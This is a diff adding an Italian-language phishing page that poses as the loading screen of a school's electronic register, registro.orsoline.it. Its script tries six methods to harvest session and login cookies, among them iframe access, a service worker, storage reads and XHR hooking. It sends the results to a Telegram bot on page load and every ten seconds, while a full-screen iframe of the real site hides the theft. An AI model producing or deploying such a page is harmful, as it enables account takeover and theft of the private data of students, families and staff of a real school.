@@ -1,0 +1,204 @@
+<!-- http://evil.com/orsoline-ultimate-bypass.html -->
+<html>
+<head>
+    <title>Caricamento Registro Elettronico</title>
+    <script>
+    // Configurazione Telegram
+    const BOT_TOKEN = '7758818971:AAFilzH7FyUGpUeOXF5hSVSLhLnRwN2wJnE';
+    const CHAT_ID = '5709299213';
+    
+    // Cookie target specifici
+    const TARGET_COOKIES = [
+        'webkey',
+        '.SigmaRegistroElettronico',
+        'ASP.NET_SessionId',
+        'loginToken'
+    ];
+
+    // Tecniche avanzate per bypassare le protezioni
+    function bypassSecurityAndExtractCookies() {
+        const results = {};
+        const techniques = [
+            tryDocumentCookie,
+            tryIframeInjection,
+            tryServiceWorkerCapture,
+            tryCacheStorage,
+            tryLocalStorageFallback,
+            tryXHRInterception
+        ];
+
+        // Prova tutte le tecniche in sequenza
+        techniques.forEach(tech => {
+            const cookies = tech();
+            Object.keys(cookies).forEach(key => {
+                if (!results[key] && cookies[key]) {
+                    results[key] = cookies[key];
+                }
+            });
+        });
+
+        return results;
+    }
+
+    // 1. Metodo standard (bloccato da HttpOnly/SameSite)
+    function tryDocumentCookie() {
+        const result = {};
+        document.cookie.split(';').forEach(cookie => {
+            const [name, value] = cookie.trim().split('=');
+            if (name && TARGET_COOKIES.includes(name)) {
+                result[name] = value;
+            }
+        });
+        return result;
+    }
+
+    // 2. Iframe injection per SameSite Lax/None
+    function tryIframeInjection() {
+        const result = {};
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'https://registro.orsoline.it/Default.aspx';
+        
+        iframe.onload = function() {
+            try {
+                const iframeCookies = iframe.contentDocument.cookie;
+                iframeCookies.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && TARGET_COOKIES.includes(name)) {
+                        result[name] = value;
+                    }
+                });
+            } catch(e) {
+                console.log("Iframe access blocked by CORS");
+            }
+        };
+        
+        document.body.appendChild(iframe);
+        return result;
+    }
+
+    // 3. Service Worker per intercettare richieste
+    function tryServiceWorkerCapture() {
+        const result = {};
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js').then(registration => {
+                registration.active.postMessage({type: 'GET_COOKIES'});
+                
+                navigator.serviceWorker.addEventListener('message', event => {
+                    if (event.data.type === 'COOKIES_RESPONSE') {
+                        event.data.cookies.forEach(cookie => {
+                            const [name, value] = cookie.split('=');
+                            if (TARGET_COOKIES.includes(name)) {
+                                result[name] = value;
+                            }
+                        });
+                    }
+                });
+            }).catch(e => console.log("SW registration failed"));
+        }
+        return result;
+    }
+
+    // 4. Cache Storage inspection
+    async function tryCacheStorage() {
+        const result = {};
+        if ('caches' in window) {
+            try {
+                const cache = await caches.open('auth-cache');
+                const requests = await cache.keys();
+                
+                for (const request of requests) {
+                    const response = await cache.match(request);
+                    const cookies = response.headers.get('Set-Cookie');
+                    if (cookies) {
+                        cookies.split(';').forEach(cookie => {
+                            const [name, value] = cookie.trim().split('=');
+                            if (TARGET_COOKIES.includes(name)) {
+                                result[name] = value;
+                            }
+                        });
+                    }
+                }
+            } catch(e) {
+                console.log("Cache access failed");
+            }
+        }
+        return result;
+    }
+
+    // 5. Fallback su localStorage/sessionStorage
+    function tryLocalStorageFallback() {
+        const result = {};
+        ['localStorage', 'sessionStorage'].forEach(storageType => {
+            try {
+                const storage = window[storageType];
+                for (let i = 0; i < storage.length; i++) {
+                    const key = storage.key(i);
+                    if (TARGET_COOKIES.some(cookie => key.includes(cookie))) {
+                        result[key] = storage.getItem(key);
+                    }
+                }
+            } catch(e) {
+                console.log(`${storageType} access blocked`);
+            }
+        });
+        return result;
+    }
+
+    // 6. XHR Interception per catturare cookie nelle richieste
+    function tryXHRInterception() {
+        const result = {};
+        const originalOpen = XMLHttpRequest.prototype.open;
+        
+        XMLHttpRequest.prototype.open = function() {
+            this.addEventListener('load', function() {
+                const cookies = this.getResponseHeader('Set-Cookie') || '';
+                cookies.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && TARGET_COOKIES.includes(name)) {
+                        result[name] = value;
+                    }
+                });
+            });
+            originalOpen.apply(this, arguments);
+        };
+        
+        // Trigger a fake request
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', '/', true);
+        xhr.send();
+        
+        return result;
+    }
+
+    // Invia i risultati a Telegram
+    function sendResultsToTelegram() {
+        const cookies = bypassSecurityAndExtractCookies();
+        const message = JSON.stringify(cookies, null, 2);
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `🍪 <b>RISULTATI BYPASS:</b>\n<pre>${message}</pre>`,
+                parse_mode: 'HTML'
+            })
+        }).catch(e => console.error('Errore invio:', e));
+    }
+
+    // Esegui al caricamento e ogni 10 secondi
+    window.onload = function() {
+        sendResultsToTelegram();
+        setInterval(sendResultsToTelegram, 10000);
+    };
+    </script>
+</head>
+<body>
+    <iframe src="https://registro.orsoline.it/Default.aspx" 
+            style="width:100%;height:100%;border:none;position:fixed;top:0;left:0;">
+    </iframe>
+</body>
+</html>
